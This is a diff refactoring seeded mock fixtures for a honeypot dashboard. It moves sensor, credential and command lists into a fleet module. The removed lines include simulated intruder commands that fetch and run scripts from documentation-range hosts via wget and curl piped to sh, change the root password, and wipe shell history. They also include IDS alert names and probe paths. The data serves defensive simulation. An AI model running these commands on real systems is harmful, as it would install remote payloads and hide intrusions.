@@ -1,14 +1,7 @@
 // Seeded mock fixtures. Attacker addresses come from the RFC 5737
 // documentation ranges so mock data never names a real host.
-import type {
-  AttackSource,
-  EventType,
-  HoneypotEvent,
-  Protocol,
-  Sensor,
-  SessionUser,
-  Severity,
-} from '../types'
+import type { AttackSource, HoneypotEvent, Sensor, SessionUser } from '../types'
+import { FLEET } from './fleet'
 import { createRng, hex, int, isoMinutesAgo, pick, pickSkewed } from './random'
 
 export const MOCK_USER: SessionUser = {
@@ -17,14 +10,19 @@ export const MOCK_USER: SessionUser = {
   roles: ['admin'],
 }
 
-export const SENSORS: Sensor[] = [
-  { id: 'cowrie-vps-01', name: 'cowrie-vps-01', kind: 'Cowrie', protocols: ['ssh', 'telnet'], location: 'Frankfurt, DE', status: 'online', eventsLast24h: 0, lastSeen: isoMinutesAgo(0) },
-  { id: 'cowrie-home-01', name: 'cowrie-home-01', kind: 'Cowrie', protocols: ['ssh', 'telnet'], location: 'Home lab', status: 'online', eventsLast24h: 0, lastSeen: isoMinutesAgo(1) },
-  { id: 'dionaea-vps-01', name: 'dionaea-vps-01', kind: 'Dionaea', protocols: ['smb', 'ftp', 'mysql', 'sip'], location: 'Frankfurt, DE', status: 'online', eventsLast24h: 0, lastSeen: isoMinutesAgo(1) },
-  { id: 'tanner-vps-01', name: 'tanner-vps-01', kind: 'Snare/Tanner', protocols: ['http'], location: 'Frankfurt, DE', status: 'degraded', eventsLast24h: 0, lastSeen: isoMinutesAgo(14) },
-  { id: 'rdpy-home-01', name: 'rdpy-home-01', kind: 'RDPY', protocols: ['rdp'], location: 'Home lab', status: 'online', eventsLast24h: 0, lastSeen: isoMinutesAgo(1) },
-  { id: 'suricata-vps-01', name: 'suricata-vps-01', kind: 'Suricata', protocols: ['http', 'ssh', 'smb'], location: 'Frankfurt, DE', status: 'offline', eventsLast24h: 0, lastSeen: isoMinutesAgo(190) },
-]
+/** The fleet, as the catalog lists it: one entry per `event.sensor` name. */
+export const SENSORS: Sensor[] = FLEET.map((spec) => ({
+  id: spec.id,
+  name: spec.id,
+  kind: spec.kind,
+  what: spec.what,
+  protocols: spec.protocols,
+  ports: spec.ports,
+  location: spec.ingress.includes('direct') ? 'VPS edge' : 'Home lab',
+  status: spec.status,
+  eventsLast24h: 0,
+  lastSeen: isoMinutesAgo(spec.lastSeenMinutes),
+}))
 
 const COUNTRIES = ['CN', 'US', 'RU', 'BR', 'IN', 'VN', 'NL', 'DE', 'KR', 'ID', 'IR', 'TW'] as const
 
@@ -43,39 +41,7 @@ const ORGS = [
 
 const TAGS = ['scanner', 'bruteforce', 'mirai-like', 'cryptominer', 'tor-exit', 'botnet', 'recon'] as const
 
-export const USERNAMES = ['root', 'admin', 'ubuntu', 'user', 'test', 'oracle', 'pi', 'postgres', 'git', 'support', 'guest', 'ftpuser'] as const
-
-export const PASSWORDS = ['123456', 'admin', 'password', 'root', '12345678', 'qwerty', '1234', 'P@ssw0rd', 'raspberry', 'admin123', 'toor', '111111'] as const
-
-export const COMMANDS = [
-  'uname -a',
-  'cat /proc/cpuinfo | grep name | wc -l',
-  'cd /tmp; wget http://198.51.100.23/bins.sh; chmod +x bins.sh; ./bins.sh',
-  'echo "root:Xk2j9" | chpasswd',
-  'nproc',
-  'ls -la ~/.ssh',
-  'free -m',
-  'crontab -l',
-  'curl -s http://203.0.113.9/x | sh',
-  'history -c; rm -rf ~/.bash_history',
-] as const
-
-export const PORTS: Record<Protocol, number> = { ssh: 22, telnet: 23, http: 80, smb: 445, rdp: 3389, ftp: 21, mysql: 3306, sip: 5060 }
-
-const IDS_ALERTS: Partial<Record<Protocol, string>> = {
-  ssh: 'ET SCAN Potential SSH Scan',
-  telnet: 'ET SCAN Potential Telnet Scan',
-  mysql: 'ET SCAN Suspicious inbound to mySQL port 3306',
-  smb: 'ET EXPLOIT Possible EternalBlue MS17-010',
-  rdp: 'ET SCAN MS Terminal Server Traffic on Non-standard Port',
-  sip: 'ET SCAN Sipvicious User-Agent Detected',
-}
-
-const PROTOCOL_WEIGHTS: Protocol[] = ['ssh', 'ssh', 'ssh', 'ssh', 'telnet', 'telnet', 'http', 'http', 'smb', 'rdp', 'ftp', 'mysql', 'sip']
-
-function sensorFor(protocol: Protocol, rng: () => number): Sensor {
-  return pick(rng, SENSORS.filter((s) => s.protocols.includes(protocol)))
-}
+export { COMMANDS, PASSWORDS, USERNAMES } from './fleet'
 
 function buildSources(): AttackSource[] {
   const rng = createRng(0xa11a)
@@ -104,39 +70,6 @@ function buildSources(): AttackSource[] {
   return sources
 }
 
-function eventShape(
-  protocol: Protocol,
-  rng: () => number,
-): { type: EventType; severity: Severity; username?: string; password?: string; command?: string; summary: string } {
-  const roll = rng()
-  if ((protocol === 'ssh' || protocol === 'telnet') && roll < 0.62) {
-    const username = pickSkewed(rng, USERNAMES)
-    const password = pickSkewed(rng, PASSWORDS)
-    return { type: 'login.failed', severity: 'low', username, password, summary: `Failed login ${username}/${password}` }
-  }
-  if ((protocol === 'ssh' || protocol === 'telnet') && roll < 0.7) {
-    const username = pickSkewed(rng, USERNAMES)
-    const password = pickSkewed(rng, PASSWORDS)
-    return { type: 'login.success', severity: 'medium', username, password, summary: `Login accepted ${username}/${password}` }
-  }
-  if ((protocol === 'ssh' || protocol === 'telnet') && roll < 0.93) {
-    const command = pickSkewed(rng, COMMANDS)
-    const severity: Severity = /wget|curl|chpasswd|rm -rf/.test(command) ? 'high' : 'medium'
-    return { type: 'command.input', severity, command, summary: command }
-  }
-  if (roll > 0.985) {
-    return { type: 'file.download', severity: 'critical', summary: `Payload fetched (sha256 ${hex(rng, 12)}…)` }
-  }
-  if (protocol === 'http' && roll < 0.8) {
-    const path = pick(rng, ['/wp-login.php', '/.env', '/cgi-bin/luci', '/boaform/admin/formLogin', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'])
-    return { type: 'http.request', severity: path.includes('phpunit') ? 'high' : 'low', summary: `GET ${path}` }
-  }
-  if (roll > 0.9) {
-    return { type: 'ids.alert', severity: 'high', summary: IDS_ALERTS[protocol] ?? `ET SCAN Suspicious inbound to ${protocol.toUpperCase()} port` }
-  }
-  return { type: 'connection', severity: 'info', summary: `${protocol.toUpperCase()} connection opened` }
-}
-
 function buildEvents(sources: AttackSource[]): HoneypotEvent[] {
   const rng = createRng(0xbee5)
   const events: HoneypotEvent[] = []
@@ -147,28 +80,37 @@ function buildEvents(sources: AttackSource[]): HoneypotEvent[] {
     if (!sessionIds.has(key)) sessionIds.set(key, hex(sessionRng, 12))
     return sessionIds.get(key)!
   }
-  const count = 1800
-  for (let i = 0; i < count; i++) {
-    // Denser traffic in recent hours with a mid-window burst.
-    const hour = Math.floor(24 * (1 - rng() ** 1.25))
-    const burst = rng() < 0.12 ? int(rng, 300, 420) : 0
-    const minutesAgo = burst || int(rng, 0, 59) + hour * 60
-    const protocol = pick(rng, PROTOCOL_WEIGHTS)
-    const source = pickSkewed(rng, sources)
-    const shape = eventShape(protocol, rng)
-    events.push({
-      id: `evt-${hex(rng, 10)}`,
-      timestamp: isoMinutesAgo(Math.min(minutesAgo, 24 * 60 - 1)),
-      sensor: sensorFor(protocol, rng).id,
-      protocol,
-      srcIp: source.ip,
-      srcPort: int(rng, 1024, 65535),
-      dstPort: PORTS[protocol],
-      country: source.country,
-      asn: source.asn,
-      sessionId: sessionIdFor(`${source.ip}#${int(rng, 1, 6)}`),
-      ...shape,
-    })
+  for (const spec of FLEET) {
+    for (let i = 0; i < spec.perDay; i++) {
+      // Denser traffic in recent hours with a mid-window burst, never newer
+      // than the sensor's own last event (a silent sensor stays silent).
+      const hour = Math.floor(24 * (1 - rng() ** 1.25))
+      const burst = rng() < 0.12 ? int(rng, 300, 420) : 0
+      const minutesAgo = Math.max(spec.lastSeenMinutes, burst || int(rng, 0, 59) + hour * 60)
+      const source = pickSkewed(rng, sources)
+      const sessionId = sessionIdFor(`${spec.id}#${source.ip}#${int(rng, 1, 6)}`)
+      const { type, severity, protocol, dstPort, eventName, summary, fields, username, password, command } = spec.generate(rng, sessionId)
+      events.push({
+        id: `evt-${hex(rng, 10)}`,
+        timestamp: isoMinutesAgo(Math.min(minutesAgo, 24 * 60 - 1)),
+        sensor: spec.id,
+        protocol,
+        type,
+        severity,
+        srcIp: source.ip,
+        srcPort: int(rng, 1024, 65535),
+        dstPort,
+        country: source.country,
+        asn: source.asn,
+        sessionId,
+        summary,
+        eventName,
+        fields,
+        ...(username !== undefined ? { username } : {}),
+        ...(password !== undefined ? { password } : {}),
+        ...(command !== undefined ? { command } : {}),
+      })
+    }
   }
   events.sort((a, b) => b.timestamp.localeCompare(a.timestamp))
 
